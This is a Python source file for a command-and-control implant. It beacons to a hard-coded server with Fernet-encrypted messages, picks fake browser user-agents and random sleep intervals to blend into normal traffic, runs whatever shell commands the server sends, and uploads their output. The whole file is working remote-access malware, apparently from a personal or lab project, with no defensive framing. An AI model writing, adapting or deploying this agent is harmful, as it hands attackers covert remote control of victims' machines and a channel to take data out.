import time
import uuid
import random
import requests
import subprocess
import json
from cryptography.fernet import Fernet

# Configuration
SERVER_URL = "http://172.26.247.78:4444"
BEACON_ENDPOINT = "/api/status" # Beacon
RESULT_ENDPOINT = "/api/upload" # Result
# Sleep min and max for psudo random request times 
SLEEP_MIN = 10
SLEEP_MAX = 30

SECRET_KEY = b'WT5hC0nZ1IDySQnT11S1qNal_srGJIyFDBVNu5DA84g='
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
	encoded = data.encode()
	encrypted = cipher.encrypt(encoded)
	return encrypted.decode()

def decrypt_data(data):
	decrypted = cipher.decrypt(data.encode())
	return decrypted.decode()

# Generate a random, unique ID for the agent (change later)
AGENT_ID = str(uuid.uuid4())
print(f"Agent ID: {AGENT_ID}")

# Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

headers = {
	"User-Agent": random.choice(USER_AGENTS),
    "Authorization": f"Bearer {AGENT_ID}",
    "X-Session-ID": str(uuid.uuid4())}

# Sends POST request to beacon then fetches any tasks 
def beacon():
	headers = {"User-Agent": random.choice(USER_AGENTS)}
	raw_payload = {"id": AGENT_ID}
	encrypted_payload = encrypt_data(json.dumps(raw_payload))
	try:
		response = requests.post(SERVER_URL + BEACON_ENDPOINT, json = {"data": encrypted_payload}, headers = headers)
		if response.status_code == 200:
			data = response.json()
			task = data.get("task")
			if task:
				execute_task(task)
	except Exception as e:
		print(f"[!] Beacon error: {e}")

# Executes the recived command using sys shell
def execute_task(task):
	try:
		print(f"[+] Executing task: {task}")
		result = subprocess.check_output(task, shell = True, stderr = subprocess.STDOUT) # Spawns a new process, connects to pipes to obtain results
		post_result(result.decode()) # Sends response back to server via post_result func
	except subprocess.CalledProcessError as e:
		post_result(e.output.decode())

# Sends the result to the server /result endpoint
def post_result(result):
	headers = {"User-Agent": random.choice(USER_AGENTS)}
	raw_payload = {"id": AGENT_ID, "output": result}
	encrypted_payload = encrypt_data(json.dumps(raw_payload))
	try:
		requests.post(SERVER_URL + RESULT_ENDPOINT, json = {"data": encrypted_payload}, headers = headers)
	except Exception as e:
		print(f"[!] Result posting error: {e}")

def main():
	while True:
		beacon()
		sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
		time.sleep(sleep_time)

if __name__ == "__main__":
    main()
